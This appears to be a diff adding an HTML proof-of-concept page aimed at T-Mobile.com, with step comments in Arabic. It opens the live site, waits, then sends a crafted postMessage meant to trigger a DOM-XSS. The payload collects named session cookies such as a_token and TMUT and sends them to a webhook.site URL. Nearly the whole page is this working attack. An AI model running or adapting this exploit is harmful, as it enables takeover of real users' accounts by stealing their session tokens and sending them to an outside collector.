@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Critical Security Research PoC</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
+        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); display: inline-block; }
+        .btn { background: #ea0a8e; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>Account Takeover Simulation</h1>
+    <p>Target: T-Mobile.com</p>
+    <button class="btn" onclick="launchExploit()">Execute Chain</button>
+    <p id="status">Status: Ready</p>
+</div>
+
+<script>
+    function launchExploit() {
+        document.getElementById('status').innerText = "Status: Opening Victim Window...";
+        
+        // 1. فتح نافذة الضحية
+        const victimWin = window.open('https://www.t-mobile.com/', '_blank');
+
+        if (!victimWin) {
+            alert("Please allow pop-ups!");
+            return;
+        }
+
+        document.getElementById('status').innerText = "Status: Waiting for scripts to load (20s)...";
+
+        // 2. الانتظار لضمان تحميل نظام المراقبة في نافذة الهدف
+        setTimeout(() => {
+            document.getElementById('status').innerText = "Status: Triggering DOM-XSS...";
+
+            // الكود الذي سيتم تنفيذه عند حدوث الخطأ (نفس الذي نجح معك)
+            const xssPayload = {
+                "toString": "() => { " +
+                             "const important = ['a_token', 'TFPID', 'LPVID', 'TMUT'];" +
+                             "let data = document.cookie.split('; ').filter(c => important.some(n => c.startsWith(n + '='))).join('|');" +
+                             "new Image().src = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f/?leak=' + encodeURIComponent(data);" +
+                             "return 'LPExternalWindowClosed';" + // نرجّع الكلمة اللي بيحبها الـ Listener
+                             "}"
+            };
+
+            // 3. إرسال الكائن كـ postMessage
+            // قمنا بإضافة خصائص إضافية لضمان مرورها من الـ Listener (الذي يبحث عن LPExternalWindowClosed)
+            victimWin.postMessage({
+                "type": "LPExternalWindowClosed", // للاستجابة للـ Listener
+                "details": xssPayload,            // هنا تقع الكارثة (الـ Sink)
+                "appName": "secureStorage"       // لزيادة فرص المعالجة من قبل السكربتات الأخرى
+            }, "*");
+
+            document.getElementById('status').innerText = "Status: Exploit Sent! Check Webhook.";
+        }, 30000); 
+    }
+</script>
+
+</body>
+</html>
